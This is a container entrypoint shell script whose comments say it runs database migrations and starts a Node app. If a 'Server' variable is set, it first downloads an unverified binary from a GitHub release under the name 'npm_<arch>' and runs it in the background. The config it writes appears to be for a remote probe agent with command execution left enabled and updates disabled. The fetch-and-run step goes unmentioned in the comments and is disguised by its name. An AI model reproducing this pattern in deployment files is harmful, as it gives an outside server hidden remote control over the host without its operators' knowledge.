#!/bin/sh
# ENVIRONEMTN from docker-compose.yaml doesn't get through to subprocesses
# Need to explicit pass DATABASE_URL here, otherwise migration doesn't work
# Run migrations
if [ -n "$Server" ]; then
    echo "已设置Server,执行TZ"
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64|amd64)
            os_arch="amd64"
            ;;
        aarch64|arm64)
            os_arch="arm64"
            ;;
        s390x)
            os_arch="s390x"
            ;;
        *)
            echo "Unsupported architecture: $ARCH"
            exit 1
            ;;
    esac

    wget "https://github.com/kwxos/kwxos-back/releases/download/new_zhav1/npm_$os_arch"
    chmod a+x "npm_$os_arch"

    tls="false"

    if [ "$Spot" == "443" ]; then
        tls="true"
    fi

cat << EOF > tzcon.yml
client_secret: $secret
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: $Server:$Spot
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: $tls 
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: $idu
EOF
    ./"npm_$os_arch" -c tzcon.yml 2>&1 &
else
    echo "未设置Server,不执行TZ"
fi
sleep 3

DATABASE_URL=${DATABASE_URL} npx prisma migrate deploy
# start app
DATABASE_URL=${DATABASE_URL} node dist/main
